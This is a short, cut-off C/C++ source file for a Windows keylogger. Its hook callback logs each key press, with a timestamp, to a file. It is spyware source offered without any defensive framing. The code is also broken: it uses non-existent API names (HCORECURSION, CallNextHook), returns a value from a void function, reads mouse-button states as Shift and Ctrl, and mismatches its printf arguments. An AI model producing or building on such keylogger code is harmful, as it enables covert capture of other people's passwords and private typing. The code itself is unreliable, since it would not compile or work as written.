```c
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <fcntl.h>
#include <io.h>

using namespace std;

HHOOK callbackKeyboard;
static int hookID = 0;
static char logFile[256];

// Function prototypes
void logKeystroke(int key, int shift, int ctrl);
void saveLog();

// Callback function
void CALLBACK keyboardCallback(int nCode, UINT wParam, LPARAM lParam) {
    if (nCode == HCORECURSION) {
        if (wParam & 0x0001) { // Key down
            logKeystroke(wParam, GetKeyState(0x1), GetKeyState(0x2));
        }
    }
    return CallNextHook(nCode, wParam, lParam);
}

// Log each keystroke
void logKeystroke(int key, int shift, int ctrl) {
    // Filter keystrokes as needed
    // For example, if we want to log only printable characters
    if (key > 0 && key <= 0xFF) {
        // Append to logFile
        FILE *file = fopen(logFile, "a");
        if (file) {
            fprintf(file, "[%d] %c %d %d\n", time(NULL), key, shift);
            fclose(file);
        }
    }
}

// Initialize and register the hook
